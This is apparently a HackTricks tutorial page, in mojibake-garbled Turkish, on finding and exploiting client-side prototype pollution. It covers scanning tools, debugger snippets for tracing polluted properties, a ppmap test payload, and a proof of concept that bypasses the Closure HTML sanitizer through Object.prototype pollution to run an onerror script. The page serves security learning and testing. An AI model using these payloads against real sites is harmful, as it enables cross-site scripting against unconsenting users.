# Client Side Prototype Pollution

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Otomatik araÃ§lar kullanarak keÅŸfetme

AraÃ§lar [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ve** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) **prototip kirlenmesi aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in** kullanÄ±labilir.

AyrÄ±ca, **prototip kirlenmesi aÃ§Ä±klarÄ±** iÃ§in eriÅŸtiÄŸiniz **sayfalarÄ± otomatik olarak taramak** amacÄ±yla **PPScan** [**tarayÄ±cÄ± uzantÄ±sÄ±nÄ±**](https://github.com/msrkp/PPScan) da kullanabilirsiniz.

### Bir Ã¶zelliÄŸin nerede kullanÄ±ldÄ±ÄŸÄ±nÄ± hata ayÄ±klama <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Prototype Pollution'Ä±n Temel Sebebini Bulma <a href="#id-5530" id="id-5530"></a>

Bir prototype pollution aÃ§Ä±ÄŸÄ± herhangi bir araÃ§ tarafÄ±ndan belirlendikten sonra ve eÄŸer kod aÅŸÄ±rÄ± karmaÅŸÄ±k deÄŸilse, Chrome GeliÅŸtirici AraÃ§larÄ±'nda `location.hash`, `decodeURIComponent` veya `location.search` gibi anahtar kelimeleri arayarak aÃ§Ä±ÄŸÄ± bulabilirsiniz. Bu yaklaÅŸÄ±m, JavaScript kodunun savunmasÄ±z bÃ¶lÃ¼mÃ¼nÃ¼ belirlemenizi saÄŸlar.

Daha bÃ¼yÃ¼k ve karmaÅŸÄ±k kod tabanlarÄ± iÃ§in, savunmasÄ±z kodu keÅŸfetmenin basit bir yÃ¶ntemi aÅŸaÄŸÄ±daki adÄ±mlarÄ± iÃ§erir:

1. Bir aracÄ± kullanarak bir aÃ§Ä±ÄŸÄ± belirleyin ve bir Ã¶zelliÄŸi kurucuda ayarlamak iÃ§in tasarlanmÄ±ÅŸ bir yÃ¼k elde edin. ppmap tarafÄ±ndan saÄŸlanan bir Ã¶rnek ÅŸÃ¶yle gÃ¶rÃ¼nebilir: `constructor[prototype][ppmap]=reserved`.
2. Sayfada Ã§alÄ±ÅŸacak ilk JavaScript kodunun satÄ±rÄ±nda bir kesme noktasÄ± ayarlayÄ±n. YÃ¼k ile sayfayÄ± yenileyin ve bu kesme noktasÄ±nda yÃ¼rÃ¼tmeyi durdurun.
3. JavaScript yÃ¼rÃ¼tmesi duraklatÄ±ldÄ±ÄŸÄ±nda, JS konsolunda aÅŸaÄŸÄ±daki betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±n. Bu betik, 'ppmap' Ã¶zelliÄŸi oluÅŸturulduÄŸunda sinyal verecek ve kÃ¶kenini bulmanÄ±za yardÄ±mcÄ± olacaktÄ±r:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **Sources** sekmesine geri dÃ¶nÃ¼n ve â€œScript yÃ¼rÃ¼tmesini devam ettirâ€ seÃ§eneÄŸini seÃ§in. JavaScript Ã§alÄ±ÅŸmaya devam edecek ve 'ppmap' Ã¶zelliÄŸi beklendiÄŸi gibi kirletilecektir. SaÄŸlanan kod parÃ§asÄ±nÄ± kullanarak 'ppmap' Ã¶zelliÄŸinin kirletildiÄŸi tam yeri belirlemek mÃ¼mkÃ¼ndÃ¼r. **Call Stack**'i inceleyerek, kirlenmenin gerÃ§ekleÅŸtiÄŸi farklÄ± yÄ±ÄŸÄ±nlar gÃ¶zlemlenebilir.

Hangi yÄ±ÄŸÄ±nÄ± inceleyeceÄŸinize karar verirken, genellikle JavaScript kÃ¼tÃ¼phane dosyalarÄ±yla iliÅŸkili yÄ±ÄŸÄ±nlarÄ± hedeflemek faydalÄ±dÄ±r, Ã§Ã¼nkÃ¼ prototip kirlenmesi genellikle bu kÃ¼tÃ¼phaneler iÃ§inde meydana gelir. KÃ¼tÃ¼phane dosyalarÄ±na (saÄŸ tarafta, rehberlik iÃ§in saÄŸlanan bir resme benzer ÅŸekilde gÃ¶rÃ¼lebilir) baÄŸlÄ±lÄ±ÄŸÄ±nÄ± inceleyerek ilgili yÄ±ÄŸÄ±nÄ± belirleyin. 4 ve 6. satÄ±rlardaki gibi birden fazla yÄ±ÄŸÄ±n olduÄŸunda, mantÄ±klÄ± seÃ§im 4. satÄ±rdaki yÃ¼ktÃ¼r, Ã§Ã¼nkÃ¼ bu, kirlenmenin ilk gerÃ§ekleÅŸtiÄŸi yeri temsil eder ve dolayÄ±sÄ±yla zafiyetin kÃ¶k nedenidir. YÄ±ÄŸÄ±na tÄ±klamak sizi zayÄ±f koda yÃ¶nlendirecektir.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Script Gadget'larÄ±nÄ± Bulma

Gadget, **bir PP zafiyeti keÅŸfedildiÄŸinde kÃ¶tÃ¼ye kullanÄ±lacak koddur**.

Uygulama basitse, **`srcdoc/innerHTML/iframe/createElement`** gibi **anahtar kelimeleri** **arama** yapabiliriz ve kaynak kodunu gÃ¶zden geÃ§irip bunun **javascript yÃ¼rÃ¼tmesine yol aÃ§Ä±p aÃ§madÄ±ÄŸÄ±nÄ±** kontrol edebiliriz. Bazen, bahsedilen teknikler hiÃ§ gadget bulamayabilir. Bu durumda, saf kaynak kodu incelemesi aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi bazÄ± gÃ¼zel gadget'lar ortaya Ã§Ä±karÄ±r.

### Mithil kÃ¼tÃ¼phanesi kodunda PP gadget bulma Ã¶rneÄŸi

Bu yazÄ±yÄ± kontrol edin: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## ZayÄ±f kÃ¼tÃ¼phaneler iÃ§in yÃ¼klerin yeniden derlenmesi

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP aracÄ±lÄ±ÄŸÄ±yla HTML Sanitizer'larÄ± atlatma

[**Bu araÅŸtÄ±rma**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) bazÄ± HTML sanitizers kÃ¼tÃ¼phaneleri tarafÄ±ndan saÄŸlanan **sanitizasyonlarÄ± atlatmak iÃ§in kullanÄ±lacak PP gadget'larÄ±nÄ±** gÃ¶stermektedir:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referanslar

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
